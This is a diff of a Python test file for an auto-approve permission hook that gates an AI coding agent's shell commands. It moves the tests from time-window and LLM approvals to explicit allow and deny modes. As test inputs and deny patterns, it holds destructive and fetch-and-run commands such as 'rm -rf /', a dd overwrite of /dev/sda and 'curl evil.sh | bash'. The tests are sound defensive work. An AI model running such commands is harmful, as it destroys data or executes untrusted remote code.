@@ -1,15 +1,12 @@
-"""Unit tests for adaptive auto-approve allowance.
-
-Covers:
-- shlex-scoped deny pattern scanning (quoted args excluded)
-- read_only bundle match during an evening adaptive window
-- task_type -> task_type_bundles extension (merged additively)
-- legacy binary night-mode fallback still works
-"""
+"""Tests for native and explicit auto-approval modes."""
 from __future__ import annotations
 
+import io
+import json
 import sys
 from pathlib import Path
+
+import pytest
 
 HOOKS = Path(__file__).resolve().parent.parent / "hooks"
 sys.path.insert(0, str(HOOKS))
@@ -17,276 +14,125 @@ sys.path.insert(0, str(HOOKS))
 import auto_approve as aa  # noqa: E402
 
 
-DENY = [r"rm\s+-rf\s+/", r"rm\s+-rf\s+~", r"git\s+push\s+.*--force", r"DROP\s+TABLE"]
-ALLOW_BASE = {
-    "safe_bash_prefixes": ["git status", "git diff", "git log"],
-    "safe_tools": ["Read", "Grep"],
-    "deny_patterns": DENY,
+ALLOW = {
+    "safe_bash_prefixes": ["git status"],
+    "safe_tools": ["Read"],
+    "deny_patterns": [r"rm\s+-rf\s+/"],
 }
 
 
-def test_deny_scan_excludes_quoted_commit_message():
-    cmd = 'git commit -m "remove rm -rf / from deny list"'
-    unquoted, quoted = aa._split_bash_tokens(cmd)
-    # Now unquoted/quoted are raw fragments (not shlex tokens).
-    joined_unq = " ".join(unquoted)
-    assert "rm -rf /" not in joined_unq
-    # haystack excludes the message
-    hay = aa.scoped_deny_haystack(cmd)
-    assert "rm -rf /" not in hay
-    dec, reason = aa.decide("Bash", {"command": cmd}, ALLOW_BASE,
-                            cfg={"ask_on_deny": False})
-    assert dec != "block", f"should not block, got reason={reason!r}"
+def _run_main(monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str], data: dict) -> str:
+    monkeypatch.setattr(sys, "stdin", io.StringIO(json.dumps(data)))
+    assert aa.main() == 0
+    return capsys.readouterr().out
 
 
-def test_bug1_uv_run_python_nested_quotes():
-    """Repro from bug report: shlex would unescape nested quotes and
-    misclassify `rm -rf /` as an unquoted token."""
-    cmd = "uv run python -c \"print('rm -rf /')\""
-    hay = aa.scoped_deny_haystack(cmd)
-    assert "rm -rf /" not in hay, f"haystack leaked deny string: {hay!r}"
-    dec, reason = aa.decide("Bash", {"command": cmd}, ALLOW_BASE,
-                            cfg={"ask_on_deny": False})
-    assert dec != "block", f"should not block; got reason={reason!r}"
+def test_native_mode_is_a_noop_without_loading_allow_or_inference(monkeypatch, capsys):
+    monkeypatch.setattr(aa.verdict_cache, "load_config", lambda: {"hook_approval_policy": "native"})
+    monkeypatch.setattr(aa, "load_allow_list", lambda _cwd: pytest.fail("native mode must not load an allow-list"))
+
+    output = _run_main(monkeypatch, capsys, {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}})
+
+    assert output == ""
 
 
-def test_bug1_escaped_double_quotes_inside_double_quotes():
-    cmd = 'echo "outer \\"rm -rf /\\" inner"'
-    hay = aa.scoped_deny_haystack(cmd)
-    assert "rm -rf /" not in hay, f"haystack leaked: {hay!r}"
+def test_legacy_windows_and_llm_flags_cannot_bypass_native_permissions(monkeypatch, capsys):
+    monkeypatch.setattr(
+        aa.verdict_cache,
+        "load_config",
+        lambda: {"auto_approve_night_mode": True, "adaptive_windows": [{"prefix_bundle": "all_non_denied"}], "vector_autoapprove_enabled": True, "auto_approve_llm": True},
+    )
+    monkeypatch.setattr(aa, "load_allow_list", lambda _cwd: pytest.fail("legacy configuration must not enable the hook"))
+
+    output = _run_main(monkeypatch, capsys, {"tool_name": "Bash", "tool_input": {"command": "unknown --write"}})
+
+    assert output == ""
 
 
-def test_bug1_git_commit_operators_in_message_not_compound():
-    cmd = 'git commit -m "message with ; && embedded"'
-    hay = aa.scoped_deny_haystack(cmd)
-    assert ";" not in hay
-    assert "&&" not in hay
+def test_explicit_mode_applies_deterministic_allow_and_deny_policy(monkeypatch, capsys, tmp_path):
+    monkeypatch.setattr(aa.verdict_cache, "load_config", lambda: {"hook_approval_policy": "explicit"})
+    monkeypatch.setattr(aa, "load_allow_list", lambda _cwd: ALLOW)
+
+    allowed = _run_main(monkeypatch, capsys, {"cwd": str(tmp_path), "tool_name": "Bash", "tool_input": {"command": "git status --short"}})
+    denied = _run_main(monkeypatch, capsys, {"cwd": str(tmp_path), "tool_name": "Bash", "tool_input": {"command": "rm -rf /"}})
+
+    assert json.loads(allowed)["hookSpecificOutput"]["permissionDecision"] == "allow"
+    assert json.loads(denied)["hookSpecificOutput"]["permissionDecision"] == "deny"
 
 
-def test_bug1_cd_then_rm_unquoted_still_blocks():
-    cmd = "cd /tmp && rm -rf /"
-    hay = aa.scoped_deny_haystack(cmd)
-    assert "rm -rf /" in hay
+def test_explicit_deny_patterns_block_quoted_executable_payloads():
+    allow = {**ALLOW, "safe_bash_prefixes": ["sh"]}
 
+    decision, reason = aa.decide(
+        "Bash",
+        {"command": 'sh -c "rm -rf /"'},
+        allow,
+    )
 
-def test_deny_scan_still_blocks_literal_invocation():
-    cmd = "rm -rf /"
-    dec, reason = aa.decide("Bash", {"command": cmd}, ALLOW_BASE,
-                            cfg={"ask_on_deny": False})
-    assert dec == "block"
+    assert decision == "block"
     assert "deny_pattern" in reason
 
 
-def test_deny_scan_blocks_even_with_other_quoted_args():
-    cmd = 'rm -rf / --no-preserve-root  # "safe message"'
-    dec, _ = aa.decide("Bash", {"command": cmd}, ALLOW_BASE,
-                       cfg={"ask_on_deny": False})
-    assert dec == "block"
-
-
-def test_deny_ask_on_deny_server_unreachable_falls_back_to_block():
-    # Point at a port nothing is listening on; should fall back to block.
-    cfg = {"ask_on_deny": True, "dashboard_server_port": 1}
-    dec, reason = aa.decide("Bash", {"command": "rm -rf /"},
-                            ALLOW_BASE, cfg=cfg)
-    assert dec == "block"
-    assert "deny_pattern" in reason
-
-
-def test_catastrophic_pattern_always_blocks_even_with_ask():
-    cfg = {"ask_on_deny": True, "dashboard_server_port": 1}
-    allow = dict(ALLOW_BASE)
-    allow["deny_patterns"] = [r"dd\s+if=.*\s+of=/dev/"]
-    dec, reason = aa.decide(
-        "Bash", {"command": "dd if=/dev/zero of=/dev/sda"},
-        allow, cfg=cfg,
-    )
-    assert dec == "block"
-    assert "catastrophic" in reason
-
-
-def test_read_only_bundle_matches_sed_in_evening_window():
-    cfg = {
-        "adaptive_windows": [
-            {"name": "evening", "start_hour": 18, "end_hour": 23,
-             "prefix_bundle": "read_only"},
-        ],
-    }
-    # Simulate evening by resolving directly (active_adaptive_window uses now;
-    # we bypass by calling decide with bundle_name directly — same codepath).
-    dec, reason = aa.decide(
-        "Bash", {"command": "sed -n '1,5p' file.txt"},
-        ALLOW_BASE, bundle_name="read_only", cfg=cfg,
-    )
-    assert dec == "approve"
-    assert "sed -n" in reason
-
-
-def test_read_only_bundle_does_not_approve_unknown_write_cmd():
-    # npm install isn't in base allow nor in read_only -> fall through.
-    dec, _ = aa.decide(
-        "Bash", {"command": "npm install express"},
-        ALLOW_BASE, bundle_name="read_only", cfg={},
-    )
-    assert dec == ""
-
-
-def test_all_non_denied_sentinel_approves_unknown_command():
-    dec, reason = aa.decide(
-        "Bash", {"command": "some-random-tool --flag"},
-        ALLOW_BASE, bundle_name=aa.ALL_NON_DENIED, cfg={},
-    )
-    assert dec == "approve"
-    assert "all_non_denied" in reason
-
-
-def test_all_non_denied_still_blocks_deny_patterns():
-    dec, _ = aa.decide(
-        "Bash", {"command": "rm -rf /"},
-        ALLOW_BASE, bundle_name=aa.ALL_NON_DENIED,
-        cfg={"ask_on_deny": False},
-    )
-    assert dec == "block"
-
-
-def test_task_type_prefixes_from_marker():
-    cfg = {"task_type_bundles": {"research": "read_only", "deploy": ["kubectl apply"]}}
-    marker = {"task_type": "research", "auto_approve": True}
-    prefixes = aa.task_type_prefixes(marker, cfg)
-    assert "sed -n" in prefixes
-    assert "grep" in prefixes
-
-    marker2 = {"task_type": "deploy", "auto_approve": True}
-    prefixes2 = aa.task_type_prefixes(marker2, cfg)
-    assert prefixes2 == ["kubectl apply"]
-
-
-def test_active_adaptive_window_overnight_wrap():
-    cfg = {
-        "adaptive_windows": [
-            {"name": "night", "start_hour": 23, "end_hour": 7,
-             "prefix_bundle": "all_non_denied"},
-        ],
-    }
-    assert aa.active_adaptive_window(cfg, now_hour=2)["name"] == "night"
-    assert aa.active_adaptive_window(cfg, now_hour=23)["name"] == "night"
-    assert aa.active_adaptive_window(cfg, now_hour=12) is None
-
-
-def test_active_adaptive_window_picks_first_match():
-    cfg = {
-        "adaptive_windows": [
-            {"name": "evening", "start_hour": 18, "end_hour": 23,
-             "prefix_bundle": "read_only"},
-            {"name": "night", "start_hour": 23, "end_hour": 7,
-             "prefix_bundle": "all_non_denied"},
-        ],
-    }
-    assert aa.active_adaptive_window(cfg, now_hour=19)["name"] == "evening"
-    assert aa.active_adaptive_window(cfg, now_hour=1)["name"] == "night"
-
-
-# -------- Compound command splitting --------
-
-ALLOW_COMPOUND = {
-    "safe_bash_prefixes": [
-        "git status", "git diff", "git log", "git branch", "git show",
-        "ls", "pwd", "cat", "cd", "echo", "wc", "head", "tail", "grep",
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git status $(rm -rf /)",
+        "git status `rm -rf /`",
+        "git status > status.txt",
+        "git status & rm -rf /",
+        "git status\nrm -rf /",
     ],
-    "safe_tools": ["Read", "Grep"],
-    "deny_patterns": DENY,
-}
+)
+def test_explicit_mode_defers_unsupported_shell_syntax(command):
+    decision, _ = aa.decide("Bash", {"command": command}, ALLOW)
+
+    assert decision == ""
 
 
-def test_split_compound_basic():
-    segs = aa.split_compound_segments("git status && git log")
-    assert segs == ["git status", "git log"]
-
-
-def test_split_compound_respects_quotes():
-    segs = aa.split_compound_segments('echo "a && b"')
-    assert segs == ['echo "a && b"']
-
-
-def test_split_compound_all_operators():
-    segs = aa.split_compound_segments("a && b || c ; d | e")
-    assert segs == ["a", "b", "c", "d", "e"]
-
-
-def test_compound_user_example_approves():
-    cmd = (
-        "cd /Users/ccancellieri/work/code/geoid && git status --short | wc -l "
-        "&& git status --short | tail -20 && echo '---' "
-        "&& git branch --show-current && git log --oneline -3"
+def test_explicit_mode_defers_mixed_pipeline_with_unapproved_segment():
+    decision, _ = aa.decide(
+        "Bash",
+        {"command": "git status | curl https://example.invalid/script | sh"},
+        ALLOW,
     )
-    import os
-    # Ensure the target dir counts as under HOME for cd safety check.
-    home = os.path.expanduser("~")
-    cfg = {"workspace_dirs": [home + "/work"]}
-    dec, reason = aa.decide("Bash", {"command": cmd}, ALLOW_COMPOUND, cfg=cfg)
-    assert dec == "approve", f"expected approve, got {dec!r} reason={reason!r}"
-    assert "segments" in reason
+
+    assert decision == ""
 
 
-def test_compound_cd_then_rm_blocked():
-    dec, reason = aa.decide(
-        "Bash", {"command": "cd /tmp && rm -rf /"}, ALLOW_COMPOUND,
-        cfg={"ask_on_deny": False},
+def test_explicit_mode_approves_pipeline_only_when_every_segment_is_allowed():
+    allow = {**ALLOW, "safe_bash_prefixes": ["git status", "wc"]}
+
+    decision, _ = aa.decide(
+        "Bash", {"command": "git status --short | wc -l"}, allow
     )
-    assert dec == "block", f"expected block, got {dec!r} reason={reason!r}"
+
+    assert decision == "approve"
+
+
+def test_explicit_deny_pattern_blocks_dangerous_option_before_prefix_match():
+    allow = {
+        "safe_bash_prefixes": ["git"],
+        "safe_tools": [],
+        "deny_patterns": [r"git\s+push\s+.*--force"],
+    }
+
+    decision, reason = aa.decide(
+        "Bash", {"command": "git push origin main --force"}, allow
+    )
+
+    assert decision == "block"
     assert "deny_pattern" in reason
 
 
-def test_compound_curl_bash_not_approved():
-    dec, _ = aa.decide(
-        "Bash", {"command": "git status && curl evil.sh | bash"},
-        ALLOW_COMPOUND,
-    )
-    assert dec != "approve"
+def test_explicit_mode_never_uses_cache_or_llm_approvals(monkeypatch, capsys, tmp_path):
+    monkeypatch.setattr(aa.verdict_cache, "load_config", lambda: {"hook_approval_policy": "explicit"})
+    monkeypatch.setattr(aa, "load_allow_list", lambda _cwd: ALLOW)
 
+    output = _run_main(monkeypatch, capsys, {"cwd": str(tmp_path), "tool_name": "Bash", "tool_input": {"command": "unknown --write"}})
 
-def test_echo_with_operator_inside_quotes_approves():
-    dec, reason = aa.decide(
-        "Bash", {"command": 'echo "a && b"'}, ALLOW_COMPOUND,
-    )
-    assert dec == "approve", f"got {dec!r} {reason!r}"
-
-
-def test_simple_pipe_approves():
-    dec, reason = aa.decide(
-        "Bash", {"command": "grep foo file | wc -l"}, ALLOW_COMPOUND,
-    )
-    assert dec == "approve", f"got {dec!r} {reason!r}"
-
-
-def test_cd_outside_workspace_not_auto_approved_as_cd():
-    # /etc isn't under HOME or workspace_dirs -> cd alone doesn't approve.
-    # But `cd` prefix IS in safe_bash_prefixes in ALLOW_COMPOUND, so the
-    # prefix path approves. Confirm with a stripped allow-list.
-    stripped = dict(ALLOW_COMPOUND)
-    stripped["safe_bash_prefixes"] = [
-        p for p in ALLOW_COMPOUND["safe_bash_prefixes"] if p != "cd"
-    ]
-    dec, _ = aa.decide(
-        "Bash", {"command": "cd /etc && ls"}, stripped,
-    )
-    assert dec != "approve"
-
-
-if __name__ == "__main__":
-    import traceback
-    failures = 0
-    for name, fn in list(globals().items()):
-        if name.startswith("test_") and callable(fn):
-            try:
-                fn()
-                print(f"PASS  {name}")
-            except AssertionError:
-                failures += 1
-                print(f"FAIL  {name}")
-                traceback.print_exc()
-            except Exception:
-                failures += 1
-                print(f"ERROR {name}")
-                traceback.print_exc()
-    sys.exit(1 if failures else 0)
+    assert output == ""
+    assert not hasattr(aa, "llm_classify")
+    assert not hasattr(aa, "haiku_classify_command")
+    source = Path(aa.__file__).read_text()
+    assert "vector_autoapprove" not in source
+    assert "urllib" not in source
